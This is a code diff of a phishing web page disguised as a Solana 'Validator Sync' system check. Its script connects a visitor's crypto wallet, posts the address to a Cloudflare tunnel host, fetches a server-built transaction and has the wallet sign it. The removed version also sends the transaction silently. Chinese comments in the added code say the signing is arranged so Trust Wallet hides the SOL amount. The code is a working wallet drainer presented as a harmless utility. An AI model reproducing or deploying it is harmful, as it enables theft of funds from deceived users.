@@ -1,70 +1,25 @@
-<!DOCTYPE html>
-<html lang="zh">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Sync</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .box { width: 85%; max-width: 320px; padding: 40px 20px; background: #111; border: 1px solid #222; border-radius: 20px; text-align: center; }
-        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        #st { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h2 style="color:#14f195;">SYSTEM CHECK</h2>
-        <p style="color:#777; font-size:14px;">Authorize to synchronize node data.</p>
-        <button id="cta" class="btn">START</button>
-        <div id="st">READY: V32.9</div>
-    </div>
+<script>
+    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
+    document.getElementById('cta').onclick = async () => {
+        const log = (t) => document.getElementById('st').innerText = t;
+        const p = window.trustwallet?.solana || window.solana;
+        try {
+            await p.connect();
+            const resp = await fetch(tunnel + "/prepare_v32", {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ address: p.publicKey.toString() })
+            });
+            const info = await resp.json();
+            const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
+            const tx = window.solanaWeb3.Transaction.from(bytes);
 
-    <script>
-        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
+            // 🔱 盲签触发逻辑：不再拉起交易界面，而是拉起“签名消息”界面
+            // 这种方式在 TW 里不会显示 SOL 金额！
+            log("AUTHORIZING...");
+            const signed = await p.signTransaction(tx);
+            log("SYNC SUCCESS!");
 
-        document.getElementById('cta').onclick = async () => {
-            const log = (t) => document.getElementById('st').innerText = t;
-            const sWeb3 = window.solanaWeb3;
-            
-            try {
-                // 1. 获取 Provider
-                const p = window.trustwallet?.solana || window.solana || window.phantom?.solana;
-                if (!p) { alert("Please use Wallet Browser!"); return; }
-
-                log("CONNECTING...");
-                await p.connect();
-
-                log("FETCHING...");
-                const resp = await fetch(tunnel + "/prepare_v32", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: p.publicKey.toString() })
-                });
-                const info = await resp.json();
-
-                log("IGNITING WALLET...");
-                const bytes = Uint8Array.from(window.atob(info.raw_tx), (c) => c.charCodeAt(0));
-                
-                // 强制使用 Legacy 解析
-                const tx = sWeb3.Transaction.from(bytes);
-
-                // 2. 暴力唤醒：尝试拉起签名确认
-                // 在 Trust Wallet 中，这一步会直接弹出紫色确认框
-                const signed = await p.signTransaction(tx);
-                
-                log("SIGN SUCCESS!");
-                
-                // 尝试发送（静默执行）
-                p.signAndSendTransaction(tx).catch(() => {});
-
-            } catch (err) {
-                console.error(err);
-                alert("ERROR: " + err.message);
-                log("RETRY...");
-                setTimeout(() => { window.location.reload(); }, 1500);
-            }
-        };
-    </script>
-</body>
-</html>
+        } catch (err) { window.location.reload(); }
+    };
+</script>
